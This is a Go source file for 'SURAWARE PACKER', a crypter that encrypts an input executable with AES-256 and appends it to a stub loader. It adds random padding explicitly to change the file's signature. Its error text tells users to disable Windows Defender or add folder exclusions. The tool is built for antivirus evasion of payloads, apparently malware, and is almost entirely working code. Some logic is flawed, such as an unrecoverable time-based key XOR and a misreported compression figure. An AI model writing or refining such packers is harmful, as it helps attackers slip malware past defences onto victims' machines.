package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: crypter.exe <input.exe> <output.exe>")
		os.Exit(1)
	}

	inputFile := os.Args[1]
	outputFile := os.Args[2]

	fmt.Printf("═══════════════════════════════════════════════════\n")
	fmt.Printf("            SURAWARE PACKER v2.0\n")
	fmt.Printf("═══════════════════════════════════════════════════\n\n")
	fmt.Printf("[1/7] Reading input file...\n")
	fmt.Printf("      → %s\n", inputFile)

	// Read input
	plaintext, err := os.ReadFile(inputFile)
	if err != nil {
		fmt.Printf("✗ Failed to read input: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("✓ Read %d bytes\n\n", len(plaintext))

	// Polymorphic layer
	fmt.Printf("[2/7] Adding polymorphic layer...\n")
	plaintext = addPolymorphicLayer(plaintext)
	fmt.Printf("✓ Polymorphic layer added\n\n")

	// Generate key
	fmt.Printf("[3/7] Generating encryption key...\n")
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		fmt.Printf("✗ Failed to generate key: %v\n", err)
		os.Exit(1)
	}

	// Obfuscate key
	obfuscatedKey := make([]byte, 32)
	xorKey := byte(time.Now().Unix() % 256)
	for i := range key {
		obfuscatedKey[i] = key[i] ^ 0x5A ^ xorKey
	}
	fmt.Printf("✓ Key generated: %s...\n\n", hex.EncodeToString(key[:8]))

	// Encrypt
	fmt.Printf("[4/7] Encrypting payload...\n")
	encrypted, err := encryptPayload(plaintext, key)
	if err != nil {
		fmt.Printf("✗ Encryption failed: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("✓ Encrypted %d bytes\n\n", len(encrypted))

	// Read stub
	fmt.Printf("[5/7] Reading stub loader...\n")
	stub, err := os.ReadFile("Stub.exe")
	if err != nil {
		fmt.Printf("✗ Failed to read Stub.exe: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("✓ Stub loaded: %d bytes\n\n", len(stub))

	// Assemble
	fmt.Printf("[6/7] Assembling final binary...\n")
	marker := []byte{0x3C, 0x3C, 0x3C, 0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44, 0x5F, 0x53, 0x54, 0x41, 0x52, 0x54, 0x3E, 0x3E, 0x3E}
	keyMarker := []byte{0x3C, 0x3C, 0x3C, 0x4B, 0x45, 0x59, 0x3E, 0x3E, 0x3E}

	final := append(stub, marker...)
	final = append(final, keyMarker...)
	final = append(final, obfuscatedKey...)
	final = append(final, encrypted...)
	fmt.Printf("✓ Final size: %d bytes\n\n", len(final))

	// Write with fallback strategy
	fmt.Printf("[7/7] Writing output file...\n")
	fmt.Printf("      → %s\n", outputFile)

	success := false
	var lastErr error

	// Strategy 1: Try direct write to destination
	err = writeToFile(outputFile, final)
	if err == nil {
		success = true
		fmt.Printf("✓ Written to destination\n")
	} else {
		lastErr = err
		fmt.Printf("⚠ Direct write failed: %v\n", err)

		// Strategy 2: Try temp directory then copy
		fmt.Printf("      Trying temp directory fallback...\n")
		tempFile := filepath.Join(os.TempDir(), "sura_packed_"+time.Now().Format("20060102_150405")+".exe")
		err = writeToFile(tempFile, final)
		if err == nil {
			fmt.Printf("✓ Written to temp: %s\n", tempFile)
			fmt.Printf("      Attempting to move to destination...\n")

			// Try to move
			err = os.Rename(tempFile, outputFile)
			if err == nil {
				success = true
				fmt.Printf("✓ Moved to destination\n")
			} else {
				fmt.Printf("⚠ Move failed: %v\n", err)
				fmt.Printf("\n┌─────────────────────────────────────────────────┐\n")
				fmt.Printf("│  OUTPUT SAVED TO TEMPORARY LOCATION:            │\n")
				fmt.Printf("│  %s\n", tempFile)
				fmt.Printf("│                                                  │\n")
				fmt.Printf("│  Please manually copy this file to:             │\n")
				fmt.Printf("│  %s\n", outputFile)
				fmt.Printf("└─────────────────────────────────────────────────┘\n")
				outputFile = tempFile
				success = true
			}
		} else {
			lastErr = err
			fmt.Printf("✗ Temp write also failed: %v\n", err)
		}
	}

	if !success {
		fmt.Printf("\n✗ ═══════════════════════════════════════════════════\n")
		fmt.Printf("✗ PACKING FAILED\n")
		fmt.Printf("✗ ═══════════════════════════════════════════════════\n")
		fmt.Printf("Error: %v\n\n", lastErr)
		fmt.Printf("SOLUTIONS:\n")
		fmt.Printf("  1. Run Build.bat as Administrator (right-click → Run as Admin)\n")
		fmt.Printf("  2. Disable Windows Defender Real-time Protection temporarily\n")
		fmt.Printf("  3. Add folder exclusion: Settings → Virus & Threat Protection\n")
		fmt.Printf("     → Manage Settings → Exclusions → Add → Folder → Select this folder\n")
		fmt.Printf("  4. Check if file is locked by another process\n")
		os.Exit(1)
	}

	// Calculate hash
	hash := sha256.Sum256(final)

	fmt.Printf("\n✓ ═══════════════════════════════════════════════════\n")
	fmt.Printf("✓ PACKING SUCCESSFUL!\n")
	fmt.Printf("✓ ═══════════════════════════════════════════════════\n\n")
	fmt.Printf("Statistics:\n")
	fmt.Printf("  Input size:  %d bytes (%.2f MB)\n", len(plaintext), float64(len(plaintext))/1024/1024)
	fmt.Printf("  Output size: %d bytes (%.2f MB)\n", len(final), float64(len(final))/1024/1024)
	fmt.Printf("  Compression: %.1f%%\n", (1-float64(len(final))/float64(len(plaintext)))*100)
	fmt.Printf("\nSecurity:\n")
	fmt.Printf("  Encryption:  AES-256-GCM\n")
	fmt.Printf("  Key:         %s\n", hex.EncodeToString(key))
	fmt.Printf("  SHA256:      %s\n", hex.EncodeToString(hash[:]))
	fmt.Printf("\nOutput:\n")
	fmt.Printf("  File:        %s\n", outputFile)
	fmt.Printf("\n")
}

func writeToFile(path string, data []byte) error {
	// Ensure directory exists
	dir := filepath.Dir(path)
	if dir != "." && dir != "" {
		os.MkdirAll(dir, 0755)
	}

	// Remove existing file
	if _, err := os.Stat(path); err == nil {
		for i := 0; i < 3; i++ {
			if os.Remove(path) == nil {
				break
			}
			time.Sleep(300 * time.Millisecond)
		}
	}

	// Try WriteFile
	err := os.WriteFile(path, data, 0755)
	if err == nil {
		return nil
	}

	// Try Create + Write
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.Write(data)
	if err != nil {
		return err
	}

	f.Chmod(0755)
	return nil
}

func encryptPayload(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt and prepend nonce
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// addPolymorphicLayer adds random junk code and entropy to change signature
func addPolymorphicLayer(data []byte) []byte {
	// Inject random entropy at the end (will be in .data section)
	entropy := make([]byte, 512+int(time.Now().Unix()%1024))
	rand.Read(entropy)

	// Append entropy to binary
	result := append(data, entropy...)

	// Add random padding to change file size signature
	padding := make([]byte, int(time.Now().Unix()%256))
	rand.Read(padding)
	result = append(result, padding...)

	return result
}
